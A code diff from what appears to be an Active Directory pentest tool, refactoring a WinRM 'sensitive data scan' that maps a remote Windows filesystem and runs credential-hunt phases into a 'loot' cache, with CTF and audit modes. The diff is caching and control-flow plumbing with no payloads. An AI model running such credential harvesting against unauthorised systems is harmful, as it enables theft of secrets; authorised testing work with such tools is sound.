     run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
     root_strategy = WINRM_ROOT_STRATEGY_AUTO
     workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "audit"
-    run_folder = f"{run_id}_{username}_{root_strategy}".replace("\\", "_").replace("/", "_")
+    run_folder = f"{run_id}_{username}_{root_strategy}".replace("\\", "_").replace(
+        "/", "_"
+    )
     run_root_abs = domain_subpath(
         workspace_cwd,
         shell.domains_dir,
@@ -2577,6 +2798,14 @@ def run_winrm_sensitive_data_scan(
     excluded_path_prefixes = get_winrm_excluded_path_prefixes()
     excluded_directory_names = get_winrm_excluded_directory_names()
     cache_manifest_abs, cache_manifest_rel = _get_winrm_mapping_cache_paths(
+        shell,
+        workspace_cwd=workspace_cwd,
+        domain=domain,
+        host=host,
+        username=username,
+        root_strategy=root_strategy,
+    )
+    loot_cache_base = _get_winrm_loot_cache_base(
         shell,
         workspace_cwd=workspace_cwd,
         domain=domain,
@@ -2611,113 +2840,62 @@ def run_winrm_sensitive_data_scan(
         f"excluded_prefixes={[mark_sensitive(item, 'path') for item in excluded_path_prefixes]} "
         f"excluded_directory_names={[mark_sensitive(item, 'path') for item in excluded_directory_names]}"
     )
+    from adscan_internal.services.windows_loot_cache_service import try_use_mapping_cache
+
     mapping_result: dict[str, object]
     mapping_duration_seconds = 0.0
     cache_reused = False
-    cache_age_seconds: float | None = None
-    should_attempt_cache_reuse = mapping_mode == _WINRM_MAPPING_MODE_REUSE or (
-        mapping_mode == _WINRM_MAPPING_MODE_AUTO and workspace_type == "ctf"
-    )
-    if should_attempt_cache_reuse and os.path.exists(cache_manifest_abs):
-        try:
-            cached_mapping = mapping_service.load_file_map(input_path=cache_manifest_abs)
-            cache_compatible, cache_reason = _is_winrm_mapping_cache_compatible(
-                cache_payload=cached_mapping,
-                expected_metadata=expected_cache_metadata,
+
+    if mapping_mode == _WINRM_MAPPING_MODE_REUSE:
+        # Force-reuse: bypass prompt, just load if compatible.
+        _forced = mapping_service.load_file_map(input_path=cache_manifest_abs) if os.path.exists(cache_manifest_abs) else None
+        _forced_compat = _forced and _is_winrm_mapping_cache_compatible(
+            cache_payload=_forced, expected_metadata=expected_cache_metadata,
+        )[0]
+        if _forced_compat:
+            _ecount = len(list((_forced or {}).get("entries") or []))
+            print_info(
+                "Using cached WinRM mapping from "
+                f"{mark_sensitive(cache_manifest_rel, 'path')} "
+                f"({_ecount} file entries) because reuse was forced."
             )
-            cache_age_seconds = _resolve_winrm_mapping_cache_age_seconds(
-                str(cached_mapping.get("generated_at") or "")
+            mapping_result = _forced  # type: ignore[assignment]
+            cache_reused = True
+    elif mapping_mode == _WINRM_MAPPING_MODE_AUTO and os.path.exists(cache_manifest_abs):
+        def _winrm_loader() -> "tuple[int, dict] | None":
+            data = mapping_service.load_file_map(input_path=cache_manifest_abs)
+            ok, reason = _is_winrm_mapping_cache_compatible(
+                cache_payload=data, expected_metadata=expected_cache_metadata,
             )
-            cache_fresh_enough = (
-                cache_age_seconds is not None
-                and cache_age_seconds <= _WINRM_MAPPING_CACHE_MAX_AGE_CTF.total_seconds()
-            )
-            if (
-                cache_compatible
-                and (
-                    mapping_mode == _WINRM_MAPPING_MODE_REUSE
-                    or (
-                        mapping_mode == _WINRM_MAPPING_MODE_AUTO
-                        and workspace_type == "ctf"
-                        and cache_fresh_enough
-                    )
-                )
-            ):
-                mapping_result = cached_mapping
-                cache_reused = True
-                age_label = (
-                    f"{cache_age_seconds:.0f}s old"
-                    if cache_age_seconds is not None
-                    else "age unknown"
-                )
-                if mapping_mode == _WINRM_MAPPING_MODE_REUSE:
-                    print_info(
-                        "Using cached WinRM mapping from "
-                        f"{mark_sensitive(cache_manifest_rel, 'path')} "
-                        f"({len(list(mapping_result.get('entries') or []))} file entries, "
-                        f"{age_label}) because reuse was forced."
-                    )
-                else:
-                    print_info(
-                        "Using cached WinRM mapping from "
-                        f"{mark_sensitive(cache_manifest_rel, 'path')} "
-                        f"({len(list(mapping_result.get('entries') or []))} file entries, "
-                        f"{age_label})."
-                    )
-            else:
+            if not ok:
                 print_info_debug(
-                    "Cached WinRM mapping not reused: "
-                    f"path={mark_sensitive(cache_manifest_rel, 'path')} "
-                    f"reason={mark_sensitive(cache_reason, 'text')} "
-                    f"age_seconds={cache_age_seconds if cache_age_seconds is not None else 'unknown'} "
-                    f"mapping_mode={mark_sensitive(mapping_mode, 'text')}"
+                    f"Cached WinRM mapping not compatible: reason={reason} "
+                    f"path={mark_sensitive(cache_manifest_rel, 'path')}"
                 )
-                raise FileNotFoundError("refresh mapping")
-        except Exception:
-            mapping_started_at = time.perf_counter()
-            try:
-                mapping_result = mapping_service.generate_file_map(
-                    psrp_service=_build_winrm_psrp_service(
-                        domain=domain,
-                        host=host,
-                        username=username,
-                        password=password,
-                    ),
-                    output_path=cache_manifest_abs,
-                    excluded_path_prefixes=excluded_path_prefixes,
-                    excluded_directory_names=excluded_directory_names,
-                    metadata=expected_cache_metadata,
-                )
-            except WinRMPSRPError as exc:
-                print_error(f"WinRM PSRP mapping failed: {exc}")
-                return {"completed": False, "error": str(exc)}
-            except Exception as exc:  # noqa: BLE001
-                telemetry.capture_exception(exc)
-                print_error(
-                    "Unexpected error during WinRM filesystem mapping "
-                    f"({type(exc).__name__})."
-                )
-                print_exception(
-                    show_locals=False,
-                    exception=exc,
-                    context={
-                        "domain": mark_sensitive(domain, "domain"),
-                        "host": mark_sensitive(host, "hostname"),
-                        "username": mark_sensitive(username, "user"),
-                    },
-                )
-                return {"completed": False, "error": str(exc), "error_type": type(exc).__name__}
-            mapping_duration_seconds = time.perf_counter() - mapping_started_at
-    else:
+                return None
+            return len(list(data.get("entries") or [])), data
+
+        cached = try_use_mapping_cache(
+            shell,
+            manifest_path=cache_manifest_abs,
+            workspace_type=workspace_type,
+            transport_label="WinRM",
+            loader=_winrm_loader,
+        )
+        if cached is not None:
+            print_info(
+                "Using cached WinRM mapping from "
+                f"{mark_sensitive(cache_manifest_rel, 'path')} "
+                f"({len(list(cached.get('entries') or []))} file entries)."
+            )
+            mapping_result = cached
+            cache_reused = True
+
+    if not cache_reused:
         if mapping_mode == _WINRM_MAPPING_MODE_REFRESH and os.path.exists(cache_manifest_abs):
             print_info(
                 "Cached WinRM mapping exists at "
                 f"{mark_sensitive(cache_manifest_rel, 'path')}, but refresh mode forces a new mapping."
-            )
-        elif workspace_type == "audit" and os.path.exists(cache_manifest_abs):
-            print_info(
-                "Cached WinRM mapping exists at "
-                f"{mark_sensitive(cache_manifest_rel, 'path')}, but audit mode refreshes mappings by default."
             )
         mapping_started_at = time.perf_counter()
         try:
@@ -2751,7 +2929,11 @@ def run_winrm_sensitive_data_scan(
                     "username": mark_sensitive(username, "user"),
                 },
             )
-            return {"completed": False, "error": str(exc), "error_type": type(exc).__name__}
+            return {
+                "completed": False,
+                "error": str(exc),
+                "error_type": type(exc).__name__,
+            }
         mapping_duration_seconds = time.perf_counter() - mapping_started_at
 
     entries = list(mapping_result.get("entries") or [])
@@ -2772,9 +2954,10 @@ def run_winrm_sensitive_data_scan(
         )
     print_info_debug(
         "WinRM deterministic mapping summary: "
-        f"host={mark_sensitive(host, 'hostname')} roots={[mark_sensitive(root, 'path') for root in mapping_roots]} "
-        f"excluded_prefixes={[mark_sensitive(root, 'path') for root in mapping_excluded_prefixes]} "
-        f"excluded_directory_names={[mark_sensitive(name, 'path') for name in mapping_excluded_names]} "
+        f"host={mark_sensitive(host, 'hostname')} "
+        f"roots={[mark_sensitive(r, 'path') for r in mapping_roots]} "
+        f"excluded_prefixes({len(mapping_excluded_prefixes)}) "
+        f"excluded_directory_names({len(mapping_excluded_names)}) "
         f"entries={len(entries)} duration_seconds={mapping_duration_seconds:.2f} "
         f"mapping_mode={mark_sensitive(mapping_mode, 'text')} "
         f"cache_reused={cache_reused} "
@@ -2795,28 +2978,21 @@ def run_winrm_sensitive_data_scan(
             run_root_abs=run_root_abs,
         )
 
-    phase_sequence = get_production_sensitive_scan_phase_sequence()
-    results: list[dict[str, Any]] = []
-    first_phase = phase_sequence[0]
-    first_result = _run_winrm_sensitive_scan_phase(
-        shell,
-        domain=domain,
-        host=host,
-        username=username,
-        password=password,
-        phase=first_phase,
-        entries=entries,
-        run_root_abs=run_root_abs,
+    from adscan_internal.services.smb_sensitive_phase_orchestration_service import (
+        select_sensitive_scan_phases,
     )
-    results.append(first_result)
-    if not _should_continue_with_deeper_winrm_sensitive_scan(
-        shell=shell,
-        domain=domain,
-        phase_result=first_result,
-    ):
-        return {"completed": True, "phases_run": results}
 
-    for phase in phase_sequence[1:3]:
+    selected_phases = select_sensitive_scan_phases(
+        shell, domain=domain, transport_label="WinRM"
+    )
+    if not selected_phases:
+        print_info("No WinRM credential-hunt phases selected — skipping analysis.")
+        return {"completed": True, "phases_run": []}
+
+    results: list[dict[str, Any]] = []
+    for phase in get_production_sensitive_scan_phase_sequence():
+        if phase not in selected_phases:
+            continue
         phase_result = _run_winrm_sensitive_scan_phase(
             shell,
             domain=domain,
@@ -2826,28 +3002,7 @@ def run_winrm_sensitive_data_scan(
             phase=phase,
             entries=entries,
             run_root_abs=run_root_abs,
-        )
-        results.append(phase_result)
-        if bool(phase_result.get("aborted_due_to_auth_invalid")):
-            print_warning(
-                "Stopping remaining deterministic WinRM phases because the active "
-                "WinRM credentials became invalid during this CTF workflow."
-            )
-            return {"completed": False, "phases_run": results}
-
-    if _should_continue_with_heavy_winrm_artifact_analysis(
-        shell=shell,
-        domain=domain,
-    ):
-        phase_result = _run_winrm_sensitive_scan_phase(
-            shell,
-            domain=domain,
-            host=host,
-            username=username,
-            password=password,
-            phase=SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS,
-            entries=entries,
-            run_root_abs=run_root_abs,
+            loot_cache_base=loot_cache_base,
         )
         results.append(phase_result)
         if bool(phase_result.get("aborted_due_to_auth_invalid")):
